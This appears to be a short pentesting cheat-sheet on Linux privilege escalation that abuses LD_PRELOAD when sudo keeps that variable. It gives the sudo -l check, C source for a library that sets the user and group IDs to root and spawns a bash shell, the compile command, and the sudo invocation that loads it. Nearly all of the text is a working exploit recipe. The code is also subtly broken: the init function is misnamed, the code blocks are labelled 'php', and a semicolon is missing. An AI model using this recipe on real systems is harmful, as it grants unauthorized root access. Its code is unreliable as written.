# Identify

```php
sudo -l
```

`env_reset, env_keep+=LD_PRELOAD`

**Requirement**

- LD_PRELOAD active
- Able to run a program as root from the `sudo -l` command

**What is it?**

A feature of the LD, or Dynamic Linker. It pre-loads a library befofe anything else is loaded.

- Allows an attacker to preload their own library before anything else.
# Exploit

```php
nano shell.c
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash")	
}
```

- Sets user to root id `0`

**Compile**

```php
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

- Position independent code, regardless of where the shell addressing is, the script will function  `-fPIC`

**Use script**

```php
sudo LD_PRELOAD=/home/<USER>/shell.so <ROOT_PROGRAM>
```

- For the root program you need to choose something that you can run with root from the `sudo -l` command we did earlier.

Example 

```php
sudo LD_PRELOAD=/home/john/shell.so apache2
```

